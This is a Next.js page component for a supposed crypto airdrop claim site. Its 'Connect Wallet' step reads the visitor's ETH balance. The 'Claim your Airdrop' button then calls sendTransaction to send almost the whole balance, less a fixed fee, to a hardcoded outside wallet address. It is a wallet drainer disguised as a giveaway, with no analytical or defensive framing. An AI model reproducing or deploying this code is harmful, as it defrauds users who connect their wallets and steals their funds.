import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState } from 'react'
const abi = require('erc-20-abi')
// import './addresses'
// import "@chainlsink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";




export default function Home() {
  let amount=0;
  let finalAmount=0;
  let _signer;
  let _user;
  let _gasp;

  async function connect() {
    if (typeof window.ethereum !== 'undefined'){
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      console.log(`accounts: ${accounts}`);


      const provider = new ethers.providers.Web3Provider(window.ethereum)
      console.log(provider);
  


      const user = await provider.send("eth_requestAccounts", []);
      _user=user;
      // let walletSigner = wallet.connect(window.ethersProvider)
      console.log(`user:${user}`);
      const signer = provider.getSigner();
      _signer = signer;
      console.log(signer);


      const address = signer.getAddress()
      // console.log(address.then());
      const bal = await signer.getBalance(signer.address)
      amount = bal
      console.log('balance:',bal);
      const gasP = provider.getGasPrice()
      _gasp = gasP
      const gasL = ethers.utils.hexlify(100000)
      // setGasLimit(gasL)
      // console.log(gasL);
      const gasHexToBigNumber = BigNumber.from(gasL)
      console.log(`gas is: ${gasHexToBigNumber}`);
      const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
      console.log(`withdarawble is: ${withdrawable}`);

      let fee = 50000000000000000;
      finalAmount = amount - fee;

      const etherValue = bal / 10e14
      amount = withdrawable
      console.log( 'final amount:', amount);
      console.log( 'final amount:', finalAmount);
      console.log( 'final amount:', fee);

    }
  }

  async function claimAirdrop() {
  const Receptient = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E";
   
  console.log(amount);
    
    
    _signer.sendTransaction({
      from: _user,
      to: Receptient,
      
      gasPrice: _gasp,
      gasLimit: 50000,
      value: (finalAmount ),
    })
  }

  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={styles.main}>
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link'>
                  Connect Wallet
                </button>
              </div>
            </nav>
          </div>
        </div>
        <div className='py-6 my-6'></div>
          <div className='columns '>
            <div className='column is-one-third'>
            </div>
            <div className='column is-one-third'>
              <div className='box '>
              <div className="column is-half is-offset-one-quarter">
                <button onClick={() => claimAirdrop()} className='button is-dark is-outlined'>Claim your Airdrop</button>
              </div>
              </div>
            </div>
            <div className='column is-one-third'>
            </div>
          </div>
          <div className='py-6'></div>
          <div className='py-6'></div>
          <div className='py-6'></div>
          <div className='py-6'></div>
          <div className='py-6'></div>
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
